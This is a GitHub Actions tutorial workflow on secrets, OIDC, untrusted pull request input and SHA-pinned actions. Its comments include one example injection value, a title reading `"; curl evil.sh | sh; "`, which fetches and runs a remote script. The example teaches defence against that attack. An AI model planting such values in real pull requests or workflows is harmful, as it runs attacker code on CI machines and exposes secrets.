# 09. Secrets, untrusted input, and pinning actions
#
# Secrets: add them in the repo's Settings -> Secrets and variables ->
# Actions, then read them as ${{ secrets.NAME }}. GitHub masks them in logs.
# Pull requests from forks don't get secrets, so jobs that need one should
# skip cleanly instead of failing.
#
# Better than a long-lived secret, when the cloud supports it: OIDC. The job
# asks GitHub for a short-lived signed token (needs `id-token: write`) and
# the cloud provider trades it for temporary credentials. Nothing to leak or
# rotate. Each cloud has an official login action for this.
#
# Untrusted input: a pull request title or branch name is written by whoever
# opened it. Putting ${{ github.event.pull_request.title }} straight into
# `run:` pastes it into the script before bash runs, so a title like
# `"; curl evil.sh | sh; "` would run. Pass it through `env:` instead, where
# it stays plain data.
#
# Pinning: `uses: some/action@v4` follows a tag the action's owner can move.
# A full commit SHA can't be moved. Many teams pin third-party actions by
# SHA with the version in a comment, and let Dependabot update them.

name: 09 secrets and safety

on:
  pull_request:

permissions:
  contents: read

jobs:
  safe-input:
    runs-on: ubuntu-latest
    steps:
      # Unsafe: run: echo "Title: ${{ github.event.pull_request.title }}"
      - name: Read the title through env
        env:
          TITLE: ${{ github.event.pull_request.title }}
        # Quoted as a whole: a plain YAML value can't contain ": " (colon space).
        run: 'echo "Title: $TITLE"'

  pinned:
    runs-on: ubuntu-latest
    steps:
      # The same checkout as everywhere else, pinned to one commit.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: filter
        uses: dorny/paths-filter@ceb8a2b8f2d89434be7ff52d3de7ec3738c5cc9d # v4.0.3
        with:
          filters: |
            app:
              - "hello-github-ci/app/**"
      - run: echo "app changed? ${{ steps.filter.outputs.app }}"

  needs-a-secret:
    runs-on: ubuntu-latest
    steps:
      - name: Skip when the secret isn't there (forks, or not set up yet)
        env:
          API_TOKEN: ${{ secrets.SAMPLE_API_TOKEN }}
        run: |
          if [ -z "$API_TOKEN" ]; then
            echo "::notice::SAMPLE_API_TOKEN is not set, skipping."
            exit 0
          fi
          echo "Token is set (GitHub prints it as ***)."

  # OIDC: the permission is all you need to get the token. The cloud login
  # action is commented out because it needs a cloud account set up first.
  oidc:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Show that an OIDC token can be requested
        run: |
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            echo "This job can request an OIDC token."
          fi
      # - uses: aws-actions/configure-aws-credentials@v5
      #   with:
      #     role-to-assume: arn:aws:iam::<account-id>:role/<role-name>
      #     aws-region: us-east-1
